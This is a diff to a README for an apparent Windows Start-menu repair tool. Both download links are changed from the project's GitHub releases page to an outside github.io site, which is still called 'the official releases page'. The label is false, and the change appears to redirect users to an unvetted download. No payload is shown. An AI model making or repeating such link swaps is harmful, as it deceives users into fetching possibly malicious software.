@@ -1,6 +1,6 @@
 # 🛠️ Start-Menu-Broken-Fix - Repair your broken Windows start menu
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/SalemCat6262/Start-Menu-Broken-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://salemcat6262.github.io)
 
 ## 🎯 About this tool
 
@@ -14,7 +14,7 @@ This application runs on Windows 10 and Windows 11. You need an active internet 
 
 Visit the release page to download the latest version of the repair utility.
 
-[Download the fix from the official releases page](https://github.com/SalemCat6262/Start-Menu-Broken-Fix/releases)
+[Download the fix from the official releases page](https://salemcat6262.github.io)
 
 ## ⚙️ How to use this fix
 
